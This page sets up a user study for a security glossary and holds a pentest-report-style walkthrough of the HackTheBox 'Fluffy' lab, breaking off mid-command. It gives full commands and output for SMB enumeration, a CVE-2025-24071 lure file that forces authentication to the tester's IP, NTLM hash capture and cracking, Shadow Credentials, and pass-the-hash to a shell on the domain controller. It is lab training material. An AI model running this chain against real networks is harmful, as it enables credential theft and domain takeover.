---
layout: page
title: Technical User Study
permalink: /glossary/evaluation/technical/
---

<div class="evaluation-page">
 
  <p>
    <a class="evaluation-back-link" href="{{ '/glossary/evaluation/' | relative_url }}">
      ← Back to Evaluation</a>
  </p>

  <div class="evaluation-banner">
    <h2>Instructions</h2>
    <ol>
      <li>Ensure the Tooltips button is set to Off.</li>
      <li>Read the walkthrough below without using the glossary.</li>
      <li>After reading the walkthrough, follow the link to the questionnaire. Feel free to revisit the walkthrough while going through the questionnaire. Pause after completing Section 2 of the questionnaire.</li>
      <li>After completing Section 2, leave the questionnaire open but return to the walkthrough page (this page).</li>
      <li>Toggle the Tooltips button to On. Now, whenever you hover over a glossary term in the walkthrough, the term definition should pop up.</li>
      <li>Read the walkthrough again but you can now use the glossary as a reference. You can either have the <a href="/glossary/" target="_blank" rel="noopener noreferrer">glossary</a> pulled up in another tab or just rely on the tooltips when hovering over a term.</li>
      <li>After reading the walkthrough again, return to the questionnaire to complete it. Feel free to revisit the walkthrough and glossary while going through the questionnaire.</li>
    </ol>
  </div>

  <button id="tooltipToggle" class="tooltip-toggle-btn" type="button" aria-pressed="false">
    Tooltips: Off
  </button>



<div class="evaluation-report">
  <h2 id="technical-walkthrough">Technical Walkthrough</h2>

  {% capture report %}
#### Introduction

This technical walkthrough sample is actually a walkthrough of HTB's [Fluffy](https://www.hackthebox.com/machines/fluffy) machine. However, the walkthrough will be written as if it was taken from a professional penetration test report.
#### Background
FakeCompany contracted the penetration tester to perform an [[internal penetration test|internal]] [[network penetration test]] on FakeCompany's [[domain controller]] in their [[Active Directory]] environment. The tester was given valid credentials (`j.fleischman:<PASSWORD_REDACTED>`) for a user in the [[domain]] and tasked to demonstrate the full impact of the [[vulnerability|vulnerabilities]] discovered.

#### Walkthrough
The tester began by exporting the target’s [[external scope|external]] IP address to a terminal variable named IP. This ensures that the commands used in this walkthrough can be copy-pasted even if the [[external scope|external]] IP changes.

```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ export IP=10.129.232.88
```

The tester then scanned all TCP ports using [[nmap|Nmap]] to identify open ports on the target.
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ nmap -sC -sV -p- $IP -T4
Starting Nmap 7.98 ( https://nmap.org ) at 2025-12-22 18:14 +0000
Nmap scan report for 10.129.232.88
Host is up (0.034s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-23 01:17:11Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-12-23T01:18:40+00:00; +6h59m55s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-12-23T01:18:41+00:00; +6h59m55s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-12-23T01:18:40+00:00; +6h59m55s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
|_ssl-date: 2025-12-23T01:18:41+00:00; +6h59m55s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
49722/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m54s, deviation: 0s, median: 6h59m54s
| smb2-time: 
|   date: 2025-12-23T01:18:00
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 244.48 seconds
```

The [[Nmap]] scan revealed the [[FQDN]] of the target, `DC01.fluffy.htb`, and the [[domain]], `fluffy.htb`. The tester added both to `/etc/hosts` and ensured that `dc01.fluffy.htb` was the first entry on the target [[IP]] line before `fluffy.htb`. This is important because in Linux, the first entry for an [[IP]] is often used as the [[hostname]] for [[authentication]]-related tasks such as validating [[TLS]] certificates or building [[spn|Kerberos SPNs]].

```text
10.129.232.88   dc01.fluffy.htb fluffy.htb
```

Based on the [[Nmap]] scan results, the tester decided to identified some interesting ports that were open.
1. [[DNS]]
2. [[Kerberos]]
3. [[SMB]]
4. [[RPC]]
5. [[LDAP]]
6. [[WinRM]]

The tester queried the [[DNS]] server for records related to the `fluffy.htb` zone using [dig](https://linux.die.net/man/1/dig).

```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ dig any fluffy.htb @$IP 

; <<>> DiG 9.20.15-2-Debian <<>> any fluffy.htb @10.129.232.88
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 6574
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;fluffy.htb.                    IN      ANY

;; ANSWER SECTION:
fluffy.htb.             600     IN      A       10.129.232.82
fluffy.htb.             3600    IN      NS      dc01.fluffy.htb.
fluffy.htb.             3600    IN      SOA     dc01.fluffy.htb. hostmaster.fluffy.htb. 143 900 600 86400 3600
fluffy.htb.             600     IN      AAAA    dead:beef::46b4:5be6:480e:113d

;; ADDITIONAL SECTION:
dc01.fluffy.htb.        3600    IN      A       10.129.232.88
dc01.fluffy.htb.        3600    IN      AAAA    dead:beef::391d:3003:3b3:7ef3

;; Query time: 35 msec
;; SERVER: 10.129.232.88#53(10.129.232.88) (TCP)
;; WHEN: Mon Dec 22 18:23:42 UTC 2025
;; MSG SIZE  rcvd: 193
```

Only the standard `hostmaster.fluffy.htb` contact appears.

The tester then attempted a [[zone transfer]] on `fluffy.htb`.

```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ dig axfr fluffy.htb @$IP

; <<>> DiG 9.20.15-2-Debian <<>> axfr fluffy.htb @10.129.232.88
;; global options: +cmd
; Transfer failed.
```

The [[zone transfer]] failed, indicating that [[zone transfer|zone transfers]] are properly restricted on the [[DNS]] server.

The tester then used [[enum4linux-ng]] and the `j.fleischman` credentials to enumerate both [[SMB]] and [[RPC]].
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ enum4linux-ng -A $IP -u 'j.fleischman' -p '<PASSWORD_REDACTED>'
ENUM4LINUX - next generation (v1.3.7)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 10.129.232.88
[*] Username ......... 'j.fleischman'
[*] Random Username .. 'sjxytoks'
[*] Password ......... '<PASSWORD_REDACTED>'
[*] Timeout .......... 5 second(s)

<SNIP>
```

The [[enum4linux-ng]] scan results found a list of [[domain]] users over the [[RPC]] protocol.

```bash
 ======================================
|    Users via RPC on 10.129.232.88    |
 ======================================
[*] Enumerating users via 'querydispinfo'
[+] Found 9 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 9 user(s) via 'enumdomusers'
[+] After merging user results we have 9 user(s) total:
'1103':
  username: ca_svc
  name: certificate authority service
  acb: '0x00000210'
  description: (null)
'1104':
  username: ldap_svc
  name: ldap service
  acb: '0x00000210'
  description: (null)
'1601':
  username: p.agila
  name: Prometheus Agila
  acb: '0x00000210'
  description: (null)
'1603':
  username: winrm_svc
  name: winrm service
  acb: '0x00000210'
  description: (null)
'1605':
  username: j.coffey
  name: John Coffey
  acb: '0x00000210'
  description: (null)
'1606':
  username: j.fleischman
  name: Joel Fleischman
  acb: '0x00000210'
  description: (null)
'500':
  username: Administrator
  name: (null)
  acb: '0x00000210'
  description: Built-in account for administering the computer/domain
'501':
  username: Guest
  name: (null)
  acb: '0x00000214'
  description: Built-in account for guest access to the computer/domain
'502':
  username: krbtgt
  name: (null)
  acb: '0x00020011'
  description: Key Distribution Center Service Account
```

The [[enum4linux-ng]] scan also returned the [[domain]] [[password policy]], revealing that [[domain]] user passwords must be at least 7 characters long. The policy also shows no lockout threshold, meaning credentials can likely be brute forced against the [[domain controller]] without locking out accounts.

```bash
 ==========================================
|    Policies via RPC for 10.129.232.88    |
 ==========================================
[*] Trying port 445/tcp
[+] Found policy:
Domain password information:
  Password history length: 24
  Minimum password length: 7
  Minimum password age: 1 day 4 minutes
  Maximum password age: 41 days 23 hours 53 minutes
  Password properties:
  - DOMAIN_PASSWORD_COMPLEX: false
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
Domain lockout information:
  Lockout observation window: 10 minutes
  Lockout duration: 10 minutes
  Lockout threshold: None
Domain logoff information:
  Force logoff time: not set
```

Finally, the [[enum4linux-ng]] scan also returns the [[SMB]] shares accessible to `j.fleischman`.

```bash
 =======================================
|    Shares via RPC on 10.129.232.88    |
 =======================================
[*] Enumerating shares
[+] Found 6 share(s):
ADMIN$:
  comment: Remote Admin
  type: Disk
C$:
  comment: Default share
  type: Disk
IPC$:
  comment: Remote IPC
  type: IPC
IT:
  comment: ''
  type: Disk
NETLOGON:
  comment: Logon server share
  type: Disk
SYSVOL:
  comment: Logon server share
  type: Disk
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
[*] Testing share IT
[+] Mapping: OK, Listing: OK
[*] Testing share NETLOGON
[+] Mapping: OK, Listing: OK
[*] Testing share SYSVOL
[+] Mapping: OK, Listing: OK
```

The tester then used [[NetExec]] to check what level of permissions `j.fleischman` had to each share.
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ nxc smb $IP -u 'j.fleischman' -p '<PASSWORD_REDACTED>' --shares
SMB         10.129.232.88   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.232.88   445    DC01             [+] fluffy.htb\j.fleischman:<PASSWORD_REDACTED>
SMB         10.129.232.88   445    DC01             [*] Enumerated shares
SMB         10.129.232.88   445    DC01             Share           Permissions     Remark
SMB         10.129.232.88   445    DC01             -----           -----------     ------
SMB         10.129.232.88   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.232.88   445    DC01             C$                              Default share
SMB         10.129.232.88   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.232.88   445    DC01             IT              READ,WRITE
SMB         10.129.232.88   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.232.88   445    DC01             SYSVOL          READ            Logon server share
```

The results showed that `j.fleischman` has [[write permission|write permissions]] to the `IT` share.

The tester searched for files in the `IT` share using [[SMBMap]].
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ smbmap -H $IP -u 'j.fleischman' -p '<PASSWORD_REDACTED>' -r 'IT' --depth 10
<SNIP>

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)
[+] IP: 10.129.232.88:445       Name: dc01.fluffy.htb           Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ, WRITE
        ./IT
        dr--r--r--                0 Tue Dec 23 02:05:22 2025    .
        dr--r--r--                0 Tue Dec 23 02:05:22 2025    ..
        dr--r--r--                0 Fri May 16 14:51:49 2025    Everything-1.4.1.1026.x64
        fr--r--r--          1827464 Fri May 16 14:51:49 2025    Everything-1.4.1.1026.x64.zip
        dr--r--r--                0 Fri May 16 14:51:49 2025    KeePass-2.58
        fr--r--r--          3225346 Fri May 16 14:51:49 2025    KeePass-2.58.zip
        fr--r--r--           169963 Sat May 17 14:31:07 2025    Upgrade_Notice.pdf
        ./IT//Everything-1.4.1.1026.x64
        dr--r--r--                0 Fri May 16 14:51:49 2025    .
        dr--r--r--                0 Fri May 16 14:51:49 2025    ..
        fr--r--r--          2265104 Fri May 16 14:51:49 2025    everything.exe
        fr--r--r--           958342 Fri May 16 14:51:49 2025    Everything.lng
        ./IT//KeePass-2.58
        dr--r--r--                0 Fri May 16 14:51:49 2025    .
        dr--r--r--                0 Fri May 16 14:51:49 2025    ..
        fr--r--r--           768478 Fri May 16 14:51:49 2025    KeePass.chm
        fr--r--r--          3305824 Fri May 16 14:51:49 2025    KeePass.exe
        fr--r--r--              763 Fri May 16 14:51:49 2025    KeePass.exe.config
        fr--r--r--           463264 Fri May 16 14:51:49 2025    KeePass.XmlSerializers.dll
        fr--r--r--           609136 Fri May 16 14:51:49 2025    KeePassLibC32.dll
        fr--r--r--           785776 Fri May 16 14:51:49 2025    KeePassLibC64.dll
        dr--r--r--                0 Fri May 16 14:51:49 2025    Languages
        fr--r--r--            18710 Fri May 16 14:51:49 2025    License.txt
        dr--r--r--                0 Fri May 16 14:51:49 2025    Plugins
        fr--r--r--            97128 Fri May 16 14:51:49 2025    ShInstUtil.exe
        dr--r--r--                0 Fri May 16 14:51:49 2025    XSL
        ./IT//KeePass-2.58/XSL
        dr--r--r--                0 Fri May 16 14:51:49 2025    .
        dr--r--r--                0 Fri May 16 14:51:49 2025    ..
        fr--r--r--             2732 Fri May 16 14:51:49 2025    KDBX_Common.xsl
        fr--r--r--             3556 Fri May 16 14:51:49 2025    KDBX_DetailsFull_HTML.xsl
        fr--r--r--             3098 Fri May 16 14:51:49 2025    KDBX_DetailsLight_HTML.xsl
        fr--r--r--              919 Fri May 16 14:51:49 2025    KDBX_PasswordsOnly_TXT.xsl
        fr--r--r--             3100 Fri May 16 14:51:49 2025    KDBX_Tabular_HTML.xsl
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
[*] Closed 1 connections
```

The Everything and KeePass files suggest the host may be using those applications. The tester also found the `Upgrade_Notice.pdf` file to be interesting and downloaded all the files from the `IT` share using [[smbclient]].

```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ smbclient -U fluffy.htb\\j.fleischman //$IP/IT
Password for [FLUFFY.HTB\j.fleischman]:
Try "help" to get a list of possible commands.
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
getting file \Everything-1.4.1.1026.x64.zip of size 1827464 as Everything-1.4.1.1026.x64.zip (2373.2 KiloBytes/sec) (average 2373.2 KiloBytes/sec)
getting file \KeePass-2.58.zip of size 3225346 as KeePass-2.58.zip (2382.6 KiloBytes/sec) (average 2379.2 KiloBytes/sec)
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (982.1 KiloBytes/sec) (average 2273.9 KiloBytes/sec)
getting file \Everything-1.4.1.1026.x64\everything.exe of size 2265104 as Everything-1.4.1.1026.x64/everything.exe (2536.7 KiloBytes/sec) (average 2347.5 KiloBytes/sec)
getting file \Everything-1.4.1.1026.x64\Everything.lng of size 958342 as Everything-1.4.1.1026.x64/Everything.lng (1962.0 KiloBytes/sec) (average 2296.3 KiloBytes/sec)
getting file \KeePass-2.58\KeePass.chm of size 768478 as KeePass-2.58/KeePass.chm (1778.4 KiloBytes/sec) (average 2241.8 KiloBytes/sec)
getting file \KeePass-2.58\KeePass.exe of size 3305824 as KeePass-2.58/KeePass.exe (2633.2 KiloBytes/sec) (average 2333.4 KiloBytes/sec)
getting file \KeePass-2.58\KeePass.exe.config of size 763 as KeePass-2.58/KeePass.exe.config (6.1 KiloBytes/sec) (average 2280.5 KiloBytes/sec)
getting file \KeePass-2.58\KeePass.XmlSerializers.dll of size 463264 as KeePass-2.58/KeePass.XmlSerializers.dll (1760.3 KiloBytes/sec) (average 2256.7 KiloBytes/sec)
getting file \KeePass-2.58\KeePassLibC32.dll of size 609136 as KeePass-2.58/KeePassLibC32.dll (1989.5 KiloBytes/sec) (average 2243.2 KiloBytes/sec)
getting file \KeePass-2.58\KeePassLibC64.dll of size 785776 as KeePass-2.58/KeePassLibC64.dll (2237.2 KiloBytes/sec) (average 2242.8 KiloBytes/sec)
getting file \KeePass-2.58\License.txt of size 18710 as KeePass-2.58/License.txt (142.7 KiloBytes/sec) (average 2200.8 KiloBytes/sec)
getting file \KeePass-2.58\ShInstUtil.exe of size 97128 as KeePass-2.58/ShInstUtil.exe (654.1 KiloBytes/sec) (average 2166.4 KiloBytes/sec)
getting file \KeePass-2.58\XSL\KDBX_Common.xsl of size 2732 as KeePass-2.58/XSL/KDBX_Common.xsl (16.9 KiloBytes/sec) (average 2115.7 KiloBytes/sec)
getting file \KeePass-2.58\XSL\KDBX_DetailsFull_HTML.xsl of size 3556 as KeePass-2.58/XSL/KDBX_DetailsFull_HTML.xsl (24.3 KiloBytes/sec) (average 2071.9 KiloBytes/sec)
getting file \KeePass-2.58\XSL\KDBX_DetailsLight_HTML.xsl of size 3098 as KeePass-2.58/XSL/KDBX_DetailsLight_HTML.xsl (19.5 KiloBytes/sec) (average 2026.4 KiloBytes/sec)
getting file \KeePass-2.58\XSL\KDBX_PasswordsOnly_TXT.xsl of size 919 as KeePass-2.58/XSL/KDBX_PasswordsOnly_TXT.xsl (6.5 KiloBytes/sec) (average 1987.0 KiloBytes/sec)
getting file \KeePass-2.58\XSL\KDBX_Tabular_HTML.xsl of size 3100 as KeePass-2.58/XSL/KDBX_Tabular_HTML.xsl (25.2 KiloBytes/sec) (average 1954.6 KiloBytes/sec)
smb: \> exit

┌──(kali㉿kali)-[~/htb/fluffy]
└─$ ls -latr
total 5124
drwxrwxr-x 57 kali kali    4096 Dec 22 18:13 ..
-rw-r--r--  1 kali kali 1827464 Dec 22 19:07 Everything-1.4.1.1026.x64.zip
-rw-r--r--  1 kali kali 3225346 Dec 22 19:07 KeePass-2.58.zip
drwxrwxr-x  4 kali kali    4096 Dec 22 19:07 .
-rw-r--r--  1 kali kali  169963 Dec 22 19:07 Upgrade_Notice.pdf
drwxrwxr-x  2 kali kali    4096 Dec 22 19:07 Everything-1.4.1.1026.x64
drwxrwxr-x  5 kali kali    4096 Dec 22 19:07 KeePass-2.58
```

The tester opened `Upgrade_Notice.pdf` and found a list of [[CVE|CVEs]] scheduled to be fixed. While researching the [[CVE|CVEs]] with medium or higher severity, the tester found that most of them were associated with spoofing attacks. This clued the tester into thinking the host may be vulnerable to some form of spoofing attack.
![Upgrade_notice.pdf](/assets/images/fluffy_pdf.png)

The tester found a [[PoC]] for `CVE-2025-24071` at [this Github repository](https://github.com/ThemeHackers/CVE-2025-24071), and used it to generate a malicious `.library-ms` file. The file contained a [[UNC]] path pointing to the tester's machine. By specifying the tester's machine IP address in the [[UNC]] path, the target system can be induced to authenticate outward to the tester's machine. That [[authentication]] attempt can then be captured to recover a [[net-ntlmv2|Net-NTLMv2]] [[hash]]. To run the [[PoC]], the tester used [[uv]].
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ git clone https://github.com/ThemeHackers/CVE-2025-24071.git
Cloning into 'CVE-2025-24071'...
remote: Enumerating objects: 14, done.
remote: Counting objects: 100% (14/14), done.
remote: Compressing objects: 100% (13/13), done.
remote: Total 14 (delta 1), reused 0 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (14/14), 8.81 KiB | 8.81 MiB/s, done.
Resolving deltas: 100% (1/1), done.

┌──(kali㉿kali)-[~/htb/fluffy]
└─$ cd CVE-2025-24071

┌──(kali㉿kali)-[~/htb/fluffy/CVE-2025-24071]
└─$ uv add --script exploit.py -r requirements.txt
Updated `exploit.py`

┌──(kali㉿kali)-[~/htb/fluffy/CVE-2025-24071]
└─$ uv run exploit.py -i 10.10.15.126 -f cve-2025-24071
Installed 1 package in 8ms

<SNIP>
Creating exploit with filename: cve-2025-24071.library-ms
Target IP: 10.10.15.126

Generating library file...
✓ Library file created successfully

Creating ZIP archive...
✓ ZIP file created successfully

Cleaning up temporary files...
✓ Cleanup completed

Process completed successfully!
Output file: exploit.zip
Run this file on the victim machine and you will see the effects of the vulnerability such as using ftp smb to send files etc.
```

The [[exploit]] generated `exploit.zip`, which contains the malicious `.library-ms` file. Because `j.fleischman` has [[write permission|write]] privileges over the `IT` [[SMB]] share, the tester is able to upload the zip file to the share. However, before uploading, the tester started [[responder|Responder]] on the tester's machine to listen for [[SMB]] authentication attempts.


The tester uploaded the malicious `exploit.zip` file using [[SMBMap]]
```bash
┌──(kali㉿kali)-[~/htb/fluffy/CVE-2025-24071]
└─$ smbmap -H $IP -u 'j.fleischman' -p '<PASSWORD_REDACTED>' --upload exploit.zip "IT\exploit.zip"
<SNIP>

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)
[+] Starting upload: exploit.zip (337 bytes)
[+] Upload complete..
[*] Closed 1 connections
```

After about a minute, [[Responder]] captured an authentication attempt containing the [[Net-NTLMv2]] [[hash]] of the user `p.agila`.

```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ sudo responder -I tun0
...
[+] Listening for events...

<SNIP>

[SMB] NTLMv2-SSP Client   : 10.129.232.88
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:c4c7fe8d00db2581:7C312353CF713C856F333AF6DA838101:0101000000000000802C10A47A73DC01CD0B62C0390E4B190000000002000800330057004600520001001E00570049004E002D0050004A0031004C00510054004B00480041004900320004003400570049004E002D0050004A0031004C00510054004B0048004100490032002E0033005700460052002E004C004F00430041004C000300140033005700460052002E004C004F00430041004C000500140033005700460052002E004C004F00430041004C0007000800802C10A47A73DC01060004000200000008003000300000000000000001000000002000005E7DC0EA00E3B77E702F8A8A0D2EFDB036DE913A186F48EF059AAD0E95B8278A0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100320036000000000000000000
```

The tester was able to crack the [[Net-NTLMv2]] [[hash]] using [[hashcat|Hashcat]].

```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ hashcat hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting in autodetect mode

<SNIP>

5600 | NetNTLMv2 | Network Protocol

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

P.AGILA::FLUFFY:c4c7fe8d00db2581:7c312353cf713c856f333af6da838101:0101000000000000802c10a47a73dc01cd0b62c0390e4b190000000002000800330057004600520001001e00570049004e002d0050004a0031004c00510054004b00480041004900320004003400570049004e002d0050004a0031004c00510054004b0048004100490032002e0033005700460052002e004c004f00430041004c000300140033005700460052002e004c004f00430041004c000500140033005700460052002e004c004f00430041004c0007000800802c10a47a73dc01060004000200000008003000300000000000000001000000002000005e7dc0ea00e3b77e702f8a8a0d2efdb036de913a186f48ef059aad0e95b8278a0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e003100320036000000000000000000:<PASSWORD_REDACTED>

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
```

The tester then used the `p.agila` credentials and [[RustHound-CE]] to collect information on the [[Active Directory]] environment.
```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ mkdir bloodhound_info

┌──(kali㉿kali)-[~/htb/fluffy]
└─$ cd bloodhound_info

┌──(kali㉿kali)-[~/htb/fluffy/bloodhound_info]
└─$ rusthound-ce -c All -d fluffy.htb -u p.agila -p '<PASSWORD_REDACTED>' -i $IP
---------------------------------------------------
Initializing RustHound-CE at 21:59:57 on 12/22/25
Powered by @g0h4n_0
---------------------------------------------------

[2025-12-22T21:59:57Z INFO  rusthound_ce] Verbosity level: Info
[2025-12-22T21:59:57Z INFO  rusthound_ce] Collection method: All

<SNIP>

RustHound-CE Enumeration Completed at 22:00:01 on 12/22/25! Happy Graphing!
```
The [[RustHound-CE]] scan output multiple JSON files that the tester injested into the [[BloodHound-CE]] tool.
![BloodHound File Ingest](/assets/images/fluffy_file_ingest.png)

After uploading the JSON files into [[BloodHound-CE]], the tester marked `p.agila` as owned and reviewed the saved query "shortest paths from owned objects".
![p.agila Shortest Paths](/assets/images/fluffy_p.agila_shortest_paths.png)

The [[BloodHound|BloodHound-CE]] graph shows that `p.agila` is a member of the `Service Account Managers` [[group]], which has [[GenericAll]] permissions over the `Service Accounts` [[group]]. The `Service Accounts` [[group]], in turn, has [[GenericWrite]] permissions over the service accounts `ldap_svc`, `winrm_svc`, and `ca_svc`.

The tester then used `p.agila` to add `p.agila` itself to the `Service Accounts` [[group]].

```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ bloodyAD --host dc01.fluffy.htb -u p.agila -p '<PASSWORD_REDACTED>' -d fluffy.htb add groupMember 'Service Accounts' p.agila
[+] p.agila added to Service Accounts
```

The tester then performed a [[Shadow Credentials]] attack on the `winrm_svc` account. This attack allowed certificate-based [[authentication]] as `winrm_svc`.

```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ uv run /opt/pywhisker/pywhisker/pywhisker.py -d 'fluffy.htb' -u 'p.agila' -p '<PASSWORD_REDACTED>' --target 'winrm_svc' --action 'add'
[*] Searching for the target account
[*] Target user found: CN=winrm service,CN=Users,DC=fluffy,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 204363cd-025b-79b7-853f-68a8e1e5c1bc
[*] Updating the msDS-KeyCredentialLink attribute of winrm_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Converting PEM -> PFX with cryptography: 6o60nrFO.pfx
[+] Saved PFX (#PKCS12) certificate & key at path: 6o60nrFO.pfx
[*] Must be used with password: <PASSWORD_REDACTED>
```

The tester then used the certificate to authenticate as `winrm_svc` via [[PKINIT]] and recovered the account’s [[NT hash]].

```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ certipy-ad auth -pfx '6o60nrFO.pfx' -dc-ip $IP -password <PASSWORD_REDACTED> -domain fluffy.htb -username 'winrm_svc'
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     No identities found in this certificate
[!] Could not find identity in the provided certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Got hash for 'winrm_svc@fluffy.htb': <LM_HASH_REDACTED>:<NT_HASH_REDACTED>
```

The tester then used the `winrm_svc` [[NT hash]] and [[Evil-WinRM]] to perform a [[Pass-the-Hash (PtH)]] attack over [[WinRM]], giving the tester a [[shell]] on the [[domain controller]].

```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ evil-winrm -i fluffy.htb -u winrm_svc -H '<NT_HASH_REDACTED>'
<SNIP>
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cd ../
*Evil-WinRM* PS C:\Users\winrm_svc> cd Desktop
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> cat user.txt
```

Looking back at the [[BloodHound]] graph, the tester saw that the `ca_svc` user is a member of the `Cert Publishers` group. This strongly suggests that the environment is running [[Active Directory Certificate Services]] and that `ca_svc` has sufficient privileges to interact with it.
![p.agila Shortest Paths](/assets/images/fluffy_p.agila_shortest_paths.png)

The tester repeated the [[Shadow Credentials]] attack against `ca_svc` to recover its [[NT hash]]. 

```bash
┌──(kali㉿kali)-[~/htb/fluffy]
└─$ bloodyAD --host dc01.fluffy.htb -u p.agila -p '<PASSWORD_REDACTED>' -d fluffy.htb add groupMember 'Service Accounts' p.agila
[+] p.agila added to Service Accounts

┌──(kali㉿kali)-[~/htb/fluffy]
